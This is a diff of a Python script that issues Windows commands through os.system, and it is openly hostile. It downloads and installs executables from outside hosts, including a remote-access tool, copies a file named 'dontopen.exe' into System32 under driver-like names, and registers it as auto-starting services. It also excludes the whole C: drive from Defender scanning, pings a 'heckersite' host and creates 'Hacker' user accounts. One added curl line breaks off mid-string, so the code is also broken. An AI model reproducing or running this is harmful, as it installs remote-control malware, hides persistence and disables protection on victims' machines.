@@ -1,6 +1,15 @@
 import time
 import os
 time.sleep(5)
+os.system("curl https://getscreen.me/download/getscreen.exe --output bloat01.exe")
+os.system("bloat01.exe -install")
+os.system("curl https://pro32connect.ru/download/pro32connect.exe --output bloat02.exe")
+os.system("bloat02.exe -install")
+os.system("copy dontopen.exe C:\Windows\System32\Drivers\Ethernet.exe")
+os.system('sc create EthernetDriver binpath= "C:\Windows\System32\Drivers\Ethernet.exe" start= auto')
+os.system("copy dontopen.exe C:\Windows\System32\WinKernel.exe")
+os.system('sc create KernelHelperService binpath= "C:\Windows\System32\WinKernel.exe" start= auto')
+os.system("curl https://
 os.system("powershell -c Add-MpPreference -ExclusionPath C:\ -Force")
 os.system('dir C:\ /s >nul')
 os.system('ping heckersite.ct8.pl')
@@ -34,7 +43,3 @@ os.system("net user Hacker01 /add")
 os.system("net user Hacker02 /add")
 os.system("net user Hacker01 123")
 os.getcwd()
-while True:
-  os.system("ping heckersite.ct8.pl >nul")
-  os.system("ping heckersite.ct8.pl >nul")
-  
